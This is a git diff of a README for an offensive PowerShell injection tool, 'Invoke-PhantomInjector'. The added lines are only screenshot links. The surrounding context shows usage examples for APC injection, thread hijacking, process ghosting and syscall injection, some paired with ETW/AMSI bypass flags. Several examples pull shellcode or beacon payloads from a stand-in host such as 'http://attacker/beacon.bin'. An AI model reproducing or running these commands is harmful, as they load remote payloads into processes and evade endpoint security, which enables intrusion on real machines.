@@ -55,6 +55,10 @@ Invoke-PhantomInjector `
   -InjectionMethod APC
 ```
 
+
+![image](https://github.com/user-attachments/assets/edd8ce55-6731-427f-a660-6f2f4f2ce9e0)
+
+
 ### 2. Remote Payload with ETW/AMSI Bypass
 
 ```powershell
@@ -66,6 +70,8 @@ Invoke-PhantomInjector `
   -InjectionMethod ThreadHijack
 ```
 
+
+
 ### 3. Process Ghosting (No Disk)
 
 ```powershell
@@ -76,6 +82,8 @@ Invoke-PhantomInjector `
   -PayloadUrl http://attacker/beacon.bin `
   -InjectionMethod GhostProcess
 ```
+![image](https://github.com/user-attachments/assets/55a5a903-e079-4270-8781-132153e933d3)
+
 
 ### 4. Syscall-Only Injection
 
@@ -85,6 +93,9 @@ Invoke-PhantomInjector -PayloadUrl http://attacker/sc.bin `
     -InjectionMethod RemoteThread `
     -BypassETW
 ```
+
+![image](https://github.com/user-attachments/assets/ef7831e5-524d-4910-920a-ba17cf5faeea)
+
 
 ---
 
